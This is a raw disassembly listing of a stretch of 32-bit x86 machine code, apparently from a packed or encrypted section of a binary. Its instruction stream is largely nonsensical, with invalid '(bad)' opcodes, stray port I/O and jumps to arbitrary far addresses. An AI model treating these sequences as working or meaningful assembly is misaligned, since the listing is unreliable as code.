  4267ad:	add    dh,ah
  4267af:	mov    WORD PTR [ebx],es
  4267b1:	push   esi
  4267b2:	mov    edx,edx
  4267b4:	mov    ds,edi
  4267b6:	push   ecx
  4267b7:	stc    
  4267b8:	mov    ebp,0xaac80702
  4267bd:	push   ss
  4267be:	mov    BYTE PTR [ebx],ah
  4267c0:	dec    eax
  4267c1:	sub    eax,edi
  4267c3:	ins    BYTE PTR es:[edi],dx
  4267c4:	pop    ebx
  4267c5:	push   esi
  4267c6:	out    0x79,al
  4267c8:	nop
  4267c9:	cmp    esi,DWORD PTR [eax]
  4267cb:	cmc    
  4267cc:	aam    0x2f
  4267ce:	repnz (bad) 
  4267d0:	gs xor eax,0xc83cb1f5
  4267d6:	jns    0x426840
  4267d8:	dec    ecx
  4267d9:	das    
  4267da:	add    ecx,DWORD PTR [ecx]
  4267dc:	imul   ebx,DWORD PTR [edx+esi*1+0x5a],0xe5551eea
  4267e4:	xlat   BYTE PTR ds:[ebx]
  4267e5:	(bad)  
  4267e6:	adc    DWORD PTR [edx-0x66d3e613],edx
  4267ec:	sbb    ah,BYTE PTR fs:[edx-0x52]
  4267f0:	retf   0x714
  4267f3:	xor    al,0xa0
  4267f5:	ins    DWORD PTR es:[edi],dx
  4267f6:	loope  0x42685c
  4267f8:	pop    ds
  4267f9:	mov    edx,0xdcf08770
  4267fe:	ss mov edi,0x6fbfef6e
  426804:	adc    DWORD PTR [eax+0x6dd225ce],ecx
  42680a:	out    dx,eax
  42680b:	test   eax,0xcdbd3350
  426810:	outs   dx,DWORD PTR ds:[esi]
  426811:	shl    BYTE PTR ds:0x252c1716,0xd3
  426818:	push   0xf902addb
  42681d:	sbb    eax,0xf0556df7
  426822:	icebp  
  426823:	sti    
  426824:	lods   eax,DWORD PTR ds:[esi]
  426825:	dec    eax
  426826:	inc    ecx
  426827:	lods   al,BYTE PTR ds:[esi]
  426828:	mov    edx,0x992a6dfe
  42682d:	xchg   DWORD PTR [ecx-0x3bcfd0b2],ebx
  426833:	shl    DWORD PTR [edx+0x3a43c33e],1
  426839:	daa    
  42683a:	xchg   edx,eax
  42683b:	scas   eax,DWORD PTR es:[edi]
  42683c:	xchg   edi,eax
  42683d:	dec    ebx
  42683e:	test   al,0x2e
  426840:	cmp    bl,ch
  426842:	cmp    bh,BYTE PTR [ebx+0x51]
  426845:	and    cl,BYTE PTR [ecx-0x7e]
  426848:	outs   dx,BYTE PTR ds:[esi]
  426849:	(bad)  
  42684a:	push   ss
  42684b:	fwait
  42684c:	test   esi,esi
  42684e:	enter  0xaf4e,0x60
  426852:	mov    ebx,0x99b0eaff
  426857:	cli    
  426858:	lds    edx,FWORD PTR [ebx-0x7e]
  42685b:	test   eax,0x60e67f81
  426860:	pusha  
  426861:	jle    0x426896
  426863:	fidiv  DWORD PTR [esi*8-0x3118793c]
  42686a:	adc    BYTE PTR [edi-0x2],al
  42686d:	fdivr  QWORD PTR [edx+0x1f]
  426870:	pop    edx
  426871:	jmp    0x42680c
  426873:	outs   dx,DWORD PTR ds:[esi]
  426874:	add    al,BYTE PTR [eax]
  426876:	(bad)
  42687a:	int    0xae
  42687c:	in     al,0xbf
  42687e:	sub    BYTE PTR [eax+0x3d],bl
  426881:	xor    ch,BYTE PTR [ecx+0x6e]
  426884:	and    ah,BYTE PTR [edx]
  426886:	fwait
  426887:	cmp    DWORD PTR [esi],esp
  426889:	push   ebx
  42688a:	pop    ss
  42688b:	mov    ds:0xf3fa3d57,al
  426890:	push   eax
  426891:	icebp  
  426892:	cmp    al,0x2
  426894:	push   ebx
  426895:	repnz adc ecx,DWORD PTR [edx]
  426898:	jns    0x426906
  42689a:	das    
  42689b:	push   DWORD PTR [edx+eiz*8+0x26]
  42689f:	lock adc al,0x3d
  4268a2:	ss jp  0x426869
  4268a5:	or     DWORD PTR [ecx-0x46],esi
  4268a8:	gs dec edx
  4268aa:	xor    eax,0x1e9fbe70
  4268af:	mov    ah,0x4a
  4268b1:	ins    BYTE PTR es:[edi],dx
  4268b2:	in     al,dx
  4268b3:	aaa    
  4268b4:	xor    al,BYTE PTR [eax]
	...
  426916:	mov    WORD PTR [esi+0x7d],cs
  426919:	jge    0x42691a
  42691b:	jg     0x4268a9
  42691d:	jmp    FWORD PTR [esi]
  42691f:	out    0xa0,eax
  426921:	stos   DWORD PTR es:[edi],eax
  426922:	sbb    BYTE PTR [esi-0x64a1c489],cl
  426928:	add    DWORD PTR [eax],eax
  42692a:	pop    es
  42692b:	add    DWORD PTR [eax],eax
  42692d:	add    BYTE PTR [ebx+0x4b],ch
  426930:	cli    
  426931:	leave  
  426932:	pop    ebx
  426933:	cld    
  426934:	push   ebp
  426935:	int    0x34
  426937:	shl    BYTE PTR [eax],1
  426939:	jns    0x4269b1
  42693b:	pop    es
  42693c:	sub    al,BYTE PTR [esi-0x6a]
  42693f:	fldenv [ebp-0x16]
  426942:	pop    esi
  426943:	jle    0x4269ae
  426945:	inc    edx
  426946:	jl     0x426905
  426948:	mov    ah,0x1e
  42694a:	repz pop edi
  42694c:	jl     0x4269ae
  42694e:	push   eax
  42694f:	and    al,0xdf
  426951:	inc    ebx
  426952:	add    eax,0x3e18ae36
  426957:	ds pop eax
  426959:	fist   DWORD PTR [ecx]
  42695b:	adc    DWORD PTR [ebp+0x4e],eax
  42695e:	xor    dl,cl
  426960:	lods   eax,DWORD PTR ds:[esi]
  426961:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426962:	lea    edx,[ecx]
  426964:	adc    bh,ch
  426966:	cli    
  426967:	into   
  426968:	sub    BYTE PTR [edx+0x7ca0c16a],al
  42696e:	inc    ebp
  42696f:	hlt    
  426970:	scas   eax,DWORD PTR es:[edi]
  426971:	mov    dl,0xfa
  426973:	mov    ds:0xec8464b,al
  426978:	outs   dx,BYTE PTR ds:[esi]
  426979:	push   ss
  42697a:	js     0x426998
  42697c:	pop    ecx
  42697d:	fnstcw WORD PTR [edx]
  42697f:	(bad)  
  426980:	push   eax
  426981:	jns    0x426959
  426983:	(bad)  
  426984:	mov    esi,0x28b018e0
  426989:	test   DWORD PTR [ebx+esi*4+0x22],edi
  42698d:	mov    esp,0x5b372f63
  426992:	stc    
  426993:	adc    esi,DWORD PTR [ecx-0x5002beaa]
  426999:	mov    eax,ds:0xfa0c8c2d
  42699e:	inc    edi
  42699f:	mov    al,0xe5
  4269a1:	test   eax,0x13ccc29f
  4269a6:	jo     0x4269a5
  4269a8:	inc    ecx
  4269a9:	jmp    0x73914945
  4269ae:	shr    DWORD PTR [ebx+0x2b],1
  4269b1:	stc    
  4269b2:	xchg   ecx,eax
  4269b3:	int3   
  4269b4:	sub    al,0xb4
  4269b6:	xchg   ebp,eax
  4269b7:	and    al,0x43
  4269b9:	and    al,0xd1
  4269bb:	sbb    DWORD PTR [esp+ebp*2+0x68bf4c68],edx
  4269c2:	test   DWORD PTR [ecx],ebp
  4269c4:	pavgw  mm7,QWORD PTR [ebx+0x6c]
  4269c8:	loop   0x4269ee
  4269ca:	ud0    ebp,DWORD PTR [ecx]
  4269cd:	xchg   BYTE PTR [eax],cl
  4269cf:	pop    esp
  4269d0:	ins    DWORD PTR es:[edi],dx
  4269d1:	mov    ebx,0x57bd1346
  4269d6:	shl    ebp,0x7d
  4269d9:	scas   al,BYTE PTR es:[edi]
  4269da:	dec    edx
  4269db:	xor    al,0x41
  4269dd:	mov    dh,0x5
  4269df:	or     dl,0xc8
  4269e2:	inc    esi
  4269e3:	xchg   edx,eax
  4269e4:	ins    BYTE PTR es:[edi],dx
  4269e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4269e6:	fisub  DWORD PTR [edi-0x3]
  4269e9:	sub    bl,BYTE PTR [ebp-0x4b]
  4269ec:	aas    
  4269ed:	adc    BYTE PTR [edi+0x2e],0xa6
  4269f1:	adc    DWORD PTR [ebx-0x12],edx
  4269f4:	mov    ds:0x12f50538,al
  4269f9:	call   0xd710d479
  4269fe:	sub    eax,0x35c72ec
  426a03:	mov    edi,0xb71ec032
  426a08:	sbb    bl,bl
  426a0a:	fadd   st(4),st
  426a0c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426a0d:	sbb    dl,dl
  426a0f:	adc    ebx,DWORD PTR [esp+esi*8+0x1b]
  426a13:	cmp    eax,DWORD PTR [eax+edx*1+0xd1a21d7]
  426a1a:	jmp    0x2ad4:0xde7ee465
  426a21:	pop    ecx
  426a22:	jne    0x426a52
  426a24:	add    ch,BYTE PTR [eax-0x19f19930]
  426a2a:	sti    
  426a2b:	adc    eax,0xb07640ef
  426a30:	mov    ch,0x56
  426a32:	repnz in eax,0xd8
	...
  426a95:	add    BYTE PTR [ecx-0x42a9f2d8],bl
  426a9b:	ja     0x426a78
  426a9d:	out    dx,eax
  426a9e:	xor    dl,BYTE PTR [edi+eiz*4]
  426aa1:	cld    
  426aa2:	push   ss
  426aa3:	jl     0x426a42
  426aa5:	lock gs pushf 
  426aa8:	add    DWORD PTR [eax],eax
  426aaa:	pop    es
  426aab:	add    DWORD PTR [eax],eax
  426aad:	add    al,ch
  426aaf:	dec    edi
  426ab0:	jo     0x426a5d
  426ab2:	cmp    al,0x42
  426ab4:	mov    ah,0xf2
  426ab6:	loop   0x426b22
  426ab8:	dec    esi
  426ab9:	js     0x426aed
  426abb:	jg     0x426aa8
  426abd:	scas   ax,WORD PTR es:[edi]
  426abf:	ret    0xfc27
  426ac2:	xor    BYTE PTR [esi-0x22],ah
  426ac5:	or     al,0xdb
  426ac7:	mov    ebx,0x951a4250
  426acc:	adc    eax,0xdf80989c
  426ad1:	clc    
  426ad2:	sbb    edi,DWORD PTR [edx]
  426ad4:	cmc    
  426ad5:	lock add BYTE PTR [edx],0xe4
  426ad9:	(bad)  
  426ada:	pop    ebx
  426adb:	dec    esi
  426adc:	(bad)  
  426add:	aaa    
  426ade:	in     eax,0xbc
  426ae0:	mov    cl,0x7d
  426ae2:	out    dx,al
  426ae3:	jmp    0x3221443c
  426ae8:	shl    edx,cl
  426aea:	stos   DWORD PTR es:[edi],eax
  426aeb:	js     0x426a77
  426aed:	gs std 
  426aef:	popa   
  426af0:	test   eax,0x4bc43770
  426af5:	call   0x8def:0x6bb2950a
  426afc:	push   ebx
  426afd:	loop   0x426b68
  426aff:	mov    ch,0x14
  426b01:	jbe    0x426b55
  426b03:	(bad)  
  426b04:	or     al,0x49
  426b06:	sub    eax,edx
  426b08:	push   ax
  426b0a:	imul   esi,DWORD PTR [esi],0x20
  426b0d:	jns    0x426b01
  426b0f:	mov    dh,0xe8
  426b11:	jecxz  0x426b73
  426b13:	mov    bl,BYTE PTR [edx+0x7]
  426b16:	sbb    BYTE PTR [ebx+0x1c0ac146],0x11
  426b1d:	int3   
  426b1e:	in     eax,dx
  426b1f:	scas   al,BYTE PTR es:[edi]
  426b20:	loope  0x426b15
  426b22:	pushf  
  426b23:	sti    
  426b24:	push   cs
  426b25:	mov    eax,0x6596d789
  426b2a:	adc    eax,0x6cf9e727
  426b2f:	sahf   
  426b30:	push   ds
  426b31:	adc    DWORD PTR [eax-0x4b],ebx
  426b34:	out    0x49,eax
  426b36:	jns    0x426b09
  426b38:	inc    BYTE PTR [esi]
  426b3a:	mov    eax,ds:0x4b472c4f
  426b3f:	fwait
  426b40:	adc    edx,DWORD PTR [ebx+0xe]
  426b43:	jo     0x426b4c
  426b45:	out    dx,al
  426b46:	inc    ecx
  426b47:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426b48:	ja     0x426ba4
  426b4a:	clc    
  426b4b:	loope  0x426b43
  426b4d:	iret   
  426b4e:	mov    ds:0xc3140109,eax
  426b53:	adc    esp,0xd87826cf
  426b59:	ret    0xdea0
  426b5c:	repz cs (bad) 
  426b5f:	cwde   
  426b60:	fst    DWORD PTR [ebp-0x23]
  426b63:	mov    eax,0xb1714d2a
  426b68:	aas    
  426b69:	les    ebx,FWORD PTR [edx-0x28f4b5d3]
  426b6f:	sub    al,0x72
  426b71:	fsub   QWORD PTR [edx-0x13]
  426b74:	ins    BYTE PTR es:[edi],dx
  426b75:	adc    al,0x11
  426b77:	int    0xd7
  426b79:	xchg   esp,eax
  426b7a:	jmp    edi
  426b7c:	call   0x4e32:0xc7653f86
  426b83:	or     DWORD PTR [edx],esi
  426b85:	popa   
  426b86:	sbb    al,0x74
  426b88:	outs   dx,BYTE PTR ds:[esi]
  426b89:	xchg   ecx,eax
  426b8a:	fcmovu st,st(2)
  426b8c:	push   ecx
  426b8d:	pop    esi
  426b8e:	ret    
  426b8f:	call   0x8198802b
  426b94:	sbb    cl,bl
  426b96:	push   ebx
  426b97:	mov    esp,DWORD PTR [esi+0x7b026c9e]
  426b9d:	jecxz  0x426be2
  426b9f:	mov    esp,0x64cf3b47
  426ba4:	lea    ecx,[esi-0x348bdb63]
  426baa:	imul   ecx,DWORD PTR [edi+ebx*8-0xe],0xffffff84
  426baf:	adc    edx,DWORD PTR [eax+0x602d8774]
	...
  426c15:	add    dl,ah
  426c17:	pusha  
  426c18:	test   DWORD PTR [esi+0x74f3f787],esi
  426c1e:	je     0x426c67
  426c20:	push   0xffffffb6
  426c22:	ins    BYTE PTR es:[edi],dx
  426c23:	sahf   
  426c24:	ret    
  426c25:	sub    BYTE PTR [ebp+ebx*4+0x1],0x0
  426c2a:	pop    es
  426c2b:	add    DWORD PTR [eax],eax
  426c2d:	add    al,al
  426c2f:	bound  ecx,QWORD PTR [edi]
  426c31:	mov    esi,0x39770bb8
  426c36:	adc    al,0x1d
  426c38:	addr16 xchg esp,eax
  426c3a:	mov    DWORD PTR [edi+ecx*1-0x14130055],ecx
  426c41:	int    0xe0
  426c43:	add    BYTE PTR [edi],ch
  426c45:	in     eax,0x11
  426c47:	or     BYTE PTR [edi-0x23],al
  426c4a:	enter  0xf5b,0xe4
  426c4e:	aad    0x68
  426c50:	(bad)  
  426c51:	frstor [esi]
  426c53:	add    al,0xcf
  426c55:	and    BYTE PTR [eax],ch
  426c57:	sub    al,0xb5
  426c59:	sti    
  426c5a:	add    al,0xb
  426c5c:	sbb    BYTE PTR [esi-0x11e8e1ea],0x1
  426c63:	or     esi,DWORD PTR [esp+edx*4-0x8af83f]
  426c6a:	xchg   ecx,eax
  426c6b:	out    0x8b,al
  426c6d:	aaa    
  426c6e:	add    BYTE PTR [edx+edx*1],dl
  426c71:	jle    0x426c3b
  426c73:	mov    dl,0x5e
  426c75:	add    eax,0x9a454fc9
  426c7a:	jno    0x426c4d
  426c7c:	fwait
  426c7d:	push   es
  426c7e:	rcr    DWORD PTR [ebx+0x41],cl
  426c81:	shl    BYTE PTR [esi],1
  426c83:	enter  0xeb05,0x9c
  426c87:	xchg   edi,eax
  426c88:	mov    eax,ds:0x3449d6af
  426c8d:	push   ebp
  426c8e:	jno    0x426c97
  426c90:	add    eax,0xa95fbf7a
  426c95:	mov    DWORD PTR [ebp+0x4d],ecx
  426c98:	(bad)  
  426c99:	std    
  426c9a:	loop   0x426c58
  426c9c:	pop    eax
  426c9d:	stc    
  426c9e:	nop
  426c9f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426ca0:	and    eax,0x6fa9c99b
  426ca5:	mov    BYTE PTR [eax-0x29],bh
  426ca8:	inc    ecx
  426ca9:	push   eax
  426caa:	xor    eax,0x9b0864a0
  426caf:	push   edi
  426cb0:	cs push cs
  426cb2:	outs   dx,BYTE PTR ds:[esi]
  426cb3:	mov    ch,0xbb
  426cb5:	inc    esp
  426cb6:	xchg   ebp,eax
  426cb7:	imul   DWORD PTR [ebx]
  426cb9:	lods   al,BYTE PTR ds:[esi]
  426cba:	xchg   ebp,eax
  426cbb:	xor    dl,BYTE PTR [eax]
  426cbd:	inc    edi
  426cbe:	adc    al,0xdd
  426cc0:	das    
  426cc1:	(bad)  
  426cc3:	imul   ecx,DWORD PTR [esi],0xb312697c
  426cc9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426cca:	dec    esp
  426ccb:	in     eax,0x15
  426ccd:	int    0x6f
  426ccf:	xchg   ebx,eax
  426cd0:	push   esp
  426cd1:	inc    edi
  426cd2:	jns    0x426d17
  426cd4:	xchg   DWORD PTR [edi-0x17025f7c],eax
  426cda:	adc    esi,DWORD PTR [edx]
  426cdc:	push   0xffffffb3
  426cde:	mov    dl,0xef
  426ce0:	adc    ebp,DWORD PTR [ebx-0x32b53025]
  426ce6:	(bad)  
  426ce7:	fsub   st(3),st
  426ce9:	xor    eax,ebp
  426ceb:	loope  0x426cdc
  426ced:	cld    
  426cee:	mov    ch,0x7e
  426cf0:	ja     0x426d07
  426cf2:	les    eax,FWORD PTR [edi]
  426cf4:	and    bl,BYTE PTR [edx+0x11]
  426cf7:	mov    ebp,0x55d763c4
  426cfc:	stc    
  426cfd:	jns    0x426cab
  426cff:	push   ebx
  426d00:	push   ebp
  426d01:	imul   ebx,DWORD PTR [ecx-0x24],0x48
  426d05:	pop    ebx
  426d06:	ss mov eax,0x326736fa
  426d0c:	test   DWORD PTR [ecx],ebp
  426d0e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426d0f:	stos   BYTE PTR es:[edi],al
  426d10:	mov    al,0x53
  426d12:	jecxz  0x426d27
  426d14:	adc    al,BYTE PTR [ebp-0x4dd3303]
  426d1a:	adc    bl,0xff
  426d1d:	hlt    
  426d1e:	mov    BYTE PTR [ebp+0x27f309e9],0x62
  426d25:	push   esi
  426d26:	or     cl,ah
  426d28:	adc    al,0x28
  426d2a:	ds cmc 
  426d2c:	idiv   BYTE PTR [ecx-0x13]
  426d2f:	in     eax,dx
  426d30:	(bad)  
  426d31:	jae    0x426cd0
  426d33:	out    dx,eax
  426d34:	repz add BYTE PTR [eax],al
	...
  426d93:	add    BYTE PTR [eax],al
  426d95:	add    BYTE PTR [edx],cl
  426d97:	mov    cl,0x61
  426d99:	repz sti 
  426d9b:	repz call 0xae87:0x7e1b1bf9
  426da3:	rcr    eax,1
  426da5:	push   esp
  426da6:	jae    0x426d46
  426da8:	add    DWORD PTR [eax],eax
  426daa:	pop    es
  426dab:	add    DWORD PTR [eax],eax
  426dad:	add    BYTE PTR [eax-0x147d17d0],al
  426db3:	xchg   ebp,eax
  426db4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426db5:	mov    bh,0x57
  426db8:	mov    dl,0xc9
  426dba:	xor    eax,0x1c6f0692
  426dbf:	xchg   ebp,eax
  426dc0:	in     al,0xe5
  426dc2:	mov    ah,0xe2
  426dc4:	mov    ch,0x4e
  426dc6:	pop    es
  426dc7:	mov    eax,0x33998785
  426dcc:	pop    eax
  426dcd:	rcr    BYTE PTR [ecx-0x2c],1
  426dd0:	inc    eax
  426dd1:	sbb    al,0xf3
  426dd3:	push   ss
  426dd4:	jp     0x426d8d
  426dd6:	jl     0x426d93
  426dd8:	sbb    BYTE PTR [esi],ch
  426dda:	push   ebp
  426ddb:	gs in  eax,0x45
  426dde:	mov    edx,0x1fddaf67
  426de3:	xchg   edx,eax
  426de4:	adc    al,0xce
  426de6:	and    eax,edi
  426de8:	scas   eax,DWORD PTR es:[edi]
  426de9:	in     eax,dx
  426dea:	mov    bl,0xee
  426dec:	jecxz  0x426dc6
  426dee:	mov    ecx,0xf20335f3
  426df3:	inc    ebx
  426df4:	sbb    BYTE PTR [edi-0x3869addf],ah
  426dfa:	not    BYTE PTR [ebp-0x5a]
  426dfd:	es loopne 0x426dc8
  426e00:	jg     0x426ddb
  426e02:	add    ebp,DWORD PTR [eax+0x3ced4896]
  426e08:	retf   0xeabc
  426e0b:	dec    esi
  426e0c:	dec    esp
  426e0d:	sbb    eax,0xa97409df
  426e12:	jle    0x426dc0
  426e14:	in     al,0x63
  426e16:	arpl   WORD PTR [edi-0x72],sp
  426e19:	and    BYTE PTR [ebx],dl
  426e1b:	mov    dl,0x11
  426e1d:	jl     0x426dc8
  426e1f:	fadd   DWORD PTR [edi+0x6f]
  426e22:	lea    ecx,[ebp+0x29]
  426e25:	cdq    
  426e26:	aas    
  426e27:	jp     0x426e15
  426e29:	lock mov BYTE PTR [ebp+esi*4+0x1c],ch
  426e2e:	adc    DWORD PTR [edi+0x9],esp
  426e31:	repnz stc 
  426e33:	cmp    BYTE PTR [ebp-0x4b],dh
  426e36:	stos   DWORD PTR es:[edi],eax
  426e37:	sub    DWORD PTR [eax-0x70],esi
  426e3a:	pop    ss
  426e3b:	xor    eax,0x9140a2e2
  426e40:	inc    edx
  426e41:	pusha  
  426e42:	inc    ebx
  426e43:	pandn  mm6,QWORD PTR [ebx+0x78636b04]
  426e4a:	add    al,0xdc
  426e4c:	(bad)  
  426e4d:	push   ecx
  426e4e:	push   eax
  426e4f:	or     BYTE PTR [eax],cl
  426e51:	call   FWORD PTR [ecx+0xb]
  426e54:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426e55:	inc    esi
  426e56:	push   edx
  426e57:	iret   
  426e58:	ret    0x1fb0
  426e5b:	ror    BYTE PTR [ebx+0x16],cl
  426e5e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426e5f:	scas   eax,DWORD PTR es:[edi]
  426e60:	fst    QWORD PTR [edx+0x11]
  426e63:	inc    esi
  426e64:	and    eax,0xa6dad062
  426e69:	cwde   
  426e6a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426e6b:	sbb    BYTE PTR [esi+ecx*1-0x16],cl
  426e6f:	xor    BYTE PTR [esi+0xa],dh
  426e72:	jg     0x426e20
  426e74:	scas   al,BYTE PTR es:[edi]
  426e75:	mov    bh,0x3e
  426e77:	mov    ss,WORD PTR [ecx-0x16]
  426e7a:	shl    BYTE PTR [ecx-0x66],cl
  426e7d:	pop    edx
  426e7e:	jne    0x426ec9
  426e80:	or     dl,dh
  426e82:	fwait
  426e83:	shl    BYTE PTR [ecx-0x75],1
  426e86:	mov    DWORD PTR [eax+0x7155737],eax
  426e8c:	pop    edx
  426e8d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426e8e:	sub    al,0x8e
  426e90:	test   DWORD PTR [edi-0x55],esp
  426e93:	add    eax,0x6efba46d
  426e98:	xor    di,di
  426e9b:	pop    ebx
  426e9c:	(bad)  
  426e9d:	stos   DWORD PTR es:[edi],eax
  426e9e:	into   
  426e9f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426ea0:	or     BYTE PTR [ebp+0x40aeb052],al
  426ea6:	in     al,dx
  426ea7:	sti    
  426ea8:	clc    
  426ea9:	push   eax
  426eaa:	imul   edi,DWORD PTR gs:[ebx-0x48],0x828d9cd5
  426eb2:	jmp    0x0:0x1b17
	...
  426f15:	add    BYTE PTR [edx+eiz*4-0xa380e39],ah
  426f1c:	mov    dh,0xf7
  426f1e:	pop    eax
  426f1f:	or     BYTE PTR [ecx+0x5a560da4],ch
  426f25:	dec    ecx
  426f26:	jp     0x426ec7
  426f28:	add    DWORD PTR [eax],eax
  426f2a:	pop    es
  426f2b:	add    DWORD PTR [eax],eax
  426f2d:	add    BYTE PTR [esi+0x69],ah
  426f30:	rcl    DWORD PTR [ebp+ebp*2-0x202cbb27],cl
  426f37:	mov    esi,0xb7d39312
  426f3c:	mov    ebx,0x21696641
  426f41:	inc    edx
  426f42:	enter  0xdf64,0x95
  426f46:	jge    0x426ee1
  426f48:	mov    edx,0xfb3d41fe
  426f4d:	and    DWORD PTR [ecx],0xffffffd6
  426f50:	mov    ds:0x45c03e07,al
  426f55:	push   ebx
  426f56:	in     eax,dx
  426f57:	gs jnp 0x426fcf
  426f5a:	jge    0x426f2b
  426f5c:	sbb    al,0x3b
  426f5e:	aaa    
  426f5f:	push   edi
  426f60:	(bad)  
  426f61:	lods   al,BYTE PTR ds:[esi]
  426f62:	ins    BYTE PTR es:[edi],dx
  426f63:	add    BYTE PTR [eax*4-0x326bcdf8],dl
  426f6a:	retf   0xb71f
  426f6d:	xchg   ebp,eax
  426f6e:	xlat   BYTE PTR ds:[ebx]
  426f6f:	and    edi,0xffffffd7
  426f72:	ja     0x426f82
  426f74:	test   DWORD PTR [eax],ebx
  426f76:	mov    edi,0xdedd2190
  426f7b:	fwait
  426f7c:	cdq    
  426f7d:	sahf   
  426f7e:	(bad)  
  426f7f:	jmp    0x426f85
  426f81:	add    esi,DWORD PTR [ecx]
  426f83:	xor    al,BYTE PTR [eax]
  426f85:	adc    al,0x78
  426f87:	pop    ds
  426f88:	ja     0x426ffe
  426f8a:	or     ah,bl
  426f8c:	mov    BYTE PTR [ebx-0x14],ah
  426f8f:	mov    al,0xb9
  426f91:	fdivr  DWORD PTR [ebp+0x5f]
  426f94:	fs iret 
  426f96:	adc    al,0x61
  426f98:	mov    ecx,DWORD PTR [edx]
  426f9a:	sub    eax,0x8d749a22
  426f9f:	jno    0x427003
  426fa1:	xor    dl,BYTE PTR [edx+0x59]
  426fa4:	mov    bl,0x8f
  426fa6:	jmp    0x4d4f554d
  426fab:	mov    ?,WORD PTR [esi+eax*1+0x58a21dde]
  426fb2:	loope  0x426fb9
  426fb4:	mov    eax,0x45f61059
  426fb9:	fild   QWORD PTR [edx+0x220e7ae9]
  426fbf:	hlt    
  426fc0:	add    al,0xdb
  426fc2:	jmp    0xf1dc:0xe6644bd5
  426fc9:	inc    edi
  426fca:	push   cs
  426fcb:	out    dx,eax
  426fcc:	xchg   edi,eax
  426fcd:	(bad)  
  426fce:	leave  
  426fcf:	imul   DWORD PTR [ecx]
  426fd1:	pop    es
  426fd2:	cld    
  426fd3:	add    edi,ebx
  426fd5:	mov    bl,BYTE PTR [ecx+ebp*4]
  426fd8:	xlat   BYTE PTR ds:[ebx]
  426fd9:	cmp    BYTE PTR [edx],al
  426fdb:	xlat   BYTE PTR ds:[ebx]
  426fdc:	inc    ecx
  426fdd:	(bad)  
  426fde:	xor    eax,0x79b206d3
  426fe3:	sbb    eax,0x4f399c99
  426fe8:	fs ret 
  426fea:	out    dx,eax
  426feb:	or     BYTE PTR [ebx-0x50],dh
  426fee:	jle    0x426fbd
  426ff0:	mov    eax,ds:0xc6b1afa9
  426ff5:	jmp    FWORD PTR [esi]
  426ff7:	and    bl,0xb4
  426ffa:	jge    0x42703a
  426ffc:	dec    edi
  426ffd:	aaa    
  426ffe:	pushf  
  426fff:	gs lahf 
  427001:	mov    bh,0x7b
  427003:	cdq    
  427004:	sbb    ch,ch
  427006:	cmp    eax,0xd4e6500
  42700b:	sub    al,0x6d
  42700d:	stc    
  42700e:	aad    0xf4
  427010:	adc    cl,al
  427012:	lods   al,BYTE PTR ds:[esi]
  427013:	(bad)  
  427014:	xchg   esp,eax
  427015:	cdq    
  427016:	add    al,0x7d
  427018:	fcomp  DWORD PTR [edx-0x47]
  42701b:	test   DWORD PTR [ecx+0xb52f6d4],esi
  427021:	pop    esi
  427022:	(bad)  
  427023:	jl     0x427091
  427025:	push   edi
  427026:	cli    
  427027:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427028:	push   ds
  427029:	xlat   BYTE PTR ds:[ebx]
  42702a:	push   ds
  42702b:	xchg   ecx,eax
  42702c:	test   ebp,edx
  42702e:	cdq    
  42702f:	xor    al,0xc9
  427031:	stos   BYTE PTR es:[edi],al
  427032:	stos   DWORD PTR es:[edi],eax
  427033:	clc    
  427034:	ins    BYTE PTR es:[edi],dx
	...
  427095:	add    BYTE PTR [ebp*2-0x8846ae6],cl
  42709c:	(bad)  
  42709d:	std    
  42709e:	stos   DWORD PTR es:[edi],eax
  42709f:	sbb    DWORD PTR [eax+0x1abe14c6],eax
  4270a5:	push   eax
  4270a6:	and    DWORD PTR [eax+0x1070001],0x69eb0000
  4270b0:	dec    esi
  4270b1:	xchg   edx,eax
  4270b2:	pop    ds
  4270b3:	(bad)  
  4270b4:	out    dx,eax
  4270b5:	lods   eax,DWORD PTR ds:[esi]
  4270b6:	outs   dx,BYTE PTR ds:[esi]
  4270b7:	scas   al,BYTE PTR es:[edi]
  4270b8:	jnp    0x42710f
  4270ba:	pop    ebp
  4270bb:	out    dx,al
  4270bc:	test   BYTE PTR [ecx+0x5a],cl
  4270bf:	dec    ebp
  4270c0:	pop    ss
  4270c1:	sbb    BYTE PTR [ebx],0x80
  4270c4:	loope  0x427081
  4270c6:	add    DWORD PTR [eax+eax*4-0x1e],0x240e95e0
  4270ce:	call   0x427b955b
  4270d3:	cmp    ebp,esi
  4270d5:	pop    es
  4270d6:	jb     0x42706c
  4270d8:	jmp    0x311:0x2fa496ae
  4270df:	add    dl,BYTE PTR [ebx]
  4270e1:	lds    edx,FWORD PTR [ebx]
  4270e3:	push   0x85042607
  4270e8:	into   
  4270e9:	test   BYTE PTR [eax],dh
  4270eb:	dec    edi
  4270ec:	rol    BYTE PTR [edx+0x53b83a0e],cl
  4270f2:	cmp    eax,0xefd0c9de
  4270f7:	mov    ds:0xd2997378,eax
  4270fc:	jne    0x427128
  4270fe:	js     0x4270c9
  427100:	xor    al,BYTE PTR [ebx-0x7d]
  427103:	cld    
  427104:	jl     0x427162
  427106:	dec    esp
  427107:	push   ebp
  427108:	fisubr WORD PTR [edx]
  42710a:	mov    esi,0x1ccaa3bd
  42710f:	in     al,0x3b
  427111:	mov    WORD PTR [ebp-0x19],?
  427114:	lods   al,BYTE PTR ds:[esi]
  427115:	sub    DWORD PTR [ecx],ecx
  427117:	das    
  427118:	aaa    
  427119:	pop    edi
  42711a:	dec    ecx
  42711b:	cwde   
  42711c:	fild   DWORD PTR [edi+edi*8-0xf346335]
  427123:	jg     0x42716a
  427125:	(bad)  
  427126:	in     eax,0x9b
  427128:	(bad)  
  427129:	test   DWORD PTR [edi+0x5],ebx
  42712c:	sub    DWORD PTR cs:[ebx-0x6d],ecx
  427130:	inc    ecx
